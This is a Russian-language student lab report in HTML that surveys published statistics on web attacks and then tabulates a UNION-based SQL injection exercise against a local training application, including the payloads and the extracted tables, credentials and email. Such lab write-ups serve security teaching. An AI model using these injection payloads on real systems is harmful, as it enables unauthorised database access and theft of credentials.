@@ -1,0 +1,188 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ЛР1</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="часть-i.-исследование-веб-атак-и-уязвимостей">Часть I. Исследование веб-атак и уязвимостей</h1>
+<h2 id="цель-работы">1. Цель работы</h2>
+<p>Цель данной части работы — изучить современные исследовательские отчёты российских и зарубежных организаций в области кибербезопасности, а также определить:</p>
+<ul>
+<li>долю атак на компании, осуществляемых через веб-уязвимости;</li>
+<li>распределение атак по основным типам уязвимостей;</li>
+<li>различия между глобальной и российской статистикой.</li>
+</ul>
+<hr>
+<h2 id="использованные-источники">2. Использованные источники</h2>
+<h3 id="зарубежные-источники">Зарубежные источники</h3>
+<ul>
+<li>
+<p>Verizon Data Breach Investigations Report (DBIR)<br>
+<a href="https://www.verizon.com/business/resources/reports/dbir/">https://www.verizon.com/business/resources/reports/dbir/</a></p>
+</li>
+<li>
+<p>IBM X-Force Threat Intelligence Index<br>
+<a href="https://www.ibm.com/reports/threat-intelligence">https://www.ibm.com/reports/threat-intelligence</a></p>
+</li>
+<li>
+<p>ENISA Threat Landscape<br>
+<a href="https://www.enisa.europa.eu/publications/enisa-threat-landscape">https://www.enisa.europa.eu/publications/enisa-threat-landscape</a></p>
+</li>
+<li>
+<p>OWASP Top 10<br>
+<a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></p>
+</li>
+</ul>
+<hr>
+<h3 id="российские-источники">Российские источники</h3>
+<ul>
+<li>
+<p>Positive Technologies Cybersecurity Threatscape<br>
+<a href="https://www.ptsecurity.com/ru-ru/research/analytics/">https://www.ptsecurity.com/ru-ru/research/analytics/</a></p>
+</li>
+<li>
+<p>Kaspersky Security Bulletin<br>
+<a href="https://securelist.com/">https://securelist.com/</a></p>
+</li>
+<li>
+<p>BI.ZONE Reports<br>
+<a href="https://bi.zone/reports/">https://bi.zone/reports/</a></p>
+</li>
+<li>
+<p>Group-IB Research<br>
+<a href="https://www.group-ib.com/resources/research/">https://www.group-ib.com/resources/research/</a></p>
+</li>
+</ul>
+<hr>
+<h2 id="доля-атак-через-веб-уязвимости">3. Доля атак через веб-уязвимости</h2>
+<ul>
+<li>40–70% атак в мире связаны с веб-приложениями (Verizon DBIR, IBM X-Force)</li>
+<li>до 70% атак в РФ используют веб-уязвимости (Positive Technologies)</li>
+</ul>
+<hr>
+<h2 id="распределение-уязвимостей">4. Распределение уязвимостей</h2>
+<ul>
+<li>Broken Access Control — ~94%</li>
+<li>Security Misconfiguration — ~70%</li>
+<li>Injection — ~33%</li>
+<li>RCE — до 35%</li>
+<li>XSS — ~10–15%</li>
+</ul>
+<hr>
+<h2 id="вывод-по-части-i">5. Вывод по части I</h2>
+<p>Веб-уязвимости являются основным вектором атак как в мире, так и в России. Наиболее распространены ошибки контроля доступа, неправильная конфигурация и инъекционные атаки.</p>
+<hr>
+<h1 id="часть-ii.-sql-инъекции-практика">Часть II. SQL-инъекции (практика)</h1>
+<h2 id="таблица-запросов-и-результатов">Таблица запросов и результатов</h2>
+
+<table>
+<thead>
+<tr>
+<th>№</th>
+<th>Запрос</th>
+<th>Что делает</th>
+<th>Результат</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://localhost:8080/task/?id=1,2,3...9">http://localhost:8080/task/?id=1,2,3...9</a></td>
+<td>Разведка (перебор id)</td>
+<td>admin, Volk, Matroskin, Vinni-pukh, Neznaika, kotenok, Karlson, Kesha, Volk2</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a></td>
+<td>Проверка границы</td>
+<td>Пустая страница</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a>’</td>
+<td>Проверка SQLi</td>
+<td>SQL ошибка (уязвимость подтверждена)</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a> AND 1=1</td>
+<td>Проверка TRUE условия</td>
+<td>Без изменений</td>
+</tr>
+<tr>
+<td>5</td>
+<td><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a> AND 1=2</td>
+<td>Проверка FALSE условия</td>
+<td>Без изменений</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a>’ ORDER BY 1-- +</td>
+<td>Определение структуры</td>
+<td>Успешно</td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a>’ ORDER BY 2-- +</td>
+<td>Проверка столбцов</td>
+<td>Успешно</td>
+</tr>
+<tr>
+<td>8</td>
+<td><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a>’ ORDER BY 3-- +</td>
+<td>Подтверждение 3 столбцов</td>
+<td>Успешно</td>
+</tr>
+<tr>
+<td>9</td>
+<td><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a>’ ORDER BY 4-- +</td>
+<td>Выход за предел</td>
+<td>Ошибка</td>
+</tr>
+<tr>
+<td>10</td>
+<td><a href="http://localhost:8080/task/?id=-1">http://localhost:8080/task/?id=-1</a>’ UNION SELECT GROUP_CONCAT(table_name),1,3 FROM information_schema.tables WHERE table_schema=database()-- +</td>
+<td>Получение таблиц</td>
+<td>emails, users</td>
+</tr>
+<tr>
+<td>11</td>
+<td><a href="http://localhost:8080/task/?id=-1">http://localhost:8080/task/?id=-1</a>’ UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name=‘users’-- +</td>
+<td>Структура users</td>
+<td>id, username, password</td>
+</tr>
+<tr>
+<td>12</td>
+<td><a href="http://localhost:8080/task/?id=-1">http://localhost:8080/task/?id=-1</a>’ UNION SELECT username,password,3 FROM users WHERE username=‘Volk2’-- +</td>
+<td>Данные пользователя</td>
+<td>Volk2 / Wa spoiuuuuu</td>
+</tr>
+<tr>
+<td>13</td>
+<td><a href="http://localhost:8080/task/?id=-1">http://localhost:8080/task/?id=-1</a>’ UNION SELECT id,email_id,3 FROM emails WHERE id=4-- +</td>
+<td>Получение email</td>
+<td><a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></td>
+</tr>
+</tbody>
+</table><hr>
+<h2 id="итог-по-части-ii">Итог по части II</h2>
+<p>В ходе работы было подтверждено наличие SQL-инъекции, а также продемонстрированы этапы её эксплуатации:</p>
+<ul>
+<li>разведка приложения</li>
+<li>определение структуры SQL-запроса</li>
+<li>UNION-based SQL Injection</li>
+<li>извлечение данных из таблиц</li>
+<li>получение чувствительной информации</li>
+</ul>
+<hr>
+<h2 id="общий-вывод">Общий вывод</h2>
+<p>В результате выполнения работы было установлено, что веб-уязвимости остаются критическим вектором атак, а SQL-инъекции позволяют полностью раскрывать структуру базы данных и извлекать конфиденциальные данные при отсутствии защиты.</p>
+</div>
+</body>
+
+</html>
